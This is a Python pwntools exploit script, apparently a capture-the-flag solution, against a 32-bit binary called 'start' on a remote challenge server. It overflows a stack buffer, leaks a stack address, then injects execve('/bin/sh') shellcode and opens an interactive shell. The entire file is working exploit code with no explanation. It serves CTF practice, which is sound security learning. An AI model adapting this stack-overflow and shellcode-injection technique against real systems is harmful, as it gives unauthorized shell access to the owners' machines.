from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

context(os='linux', arch='i386', log_level='debug')
binary = './start'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',26687) if argv[1]=='r' else process(binary)
# io = gdb.debug(binary,"break *0x0804809C")

write_twice = 0x08048087
payload = b'a'*0x14 + p32(write_twice)
io.sendafter(b'Let\'s start the CTF:', payload)


stack_addr = u32(io.recv(4))
print("stack_addr = ",hex(stack_addr))

# shellcode=asm(
# '''
# xor ecx,ecx;     #ecx设置为0
# xor edx,edx;	#edx设置为0
# push edx;		#将edx的值压入栈
# push 0x0068732f;
# push 0x6e69622f;
# mov ebx,esp;    #将ebx设置为’/bin/sh‘的16进制
# mov eax,oxb;    #eax设置为0xb，调用execve
# int 0x80
# ''')
shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov al,0xb;int 0x80')


payload = b'a'*0x14 + p32(stack_addr+0x14) + shellcode
io.send(payload)
io.interactive()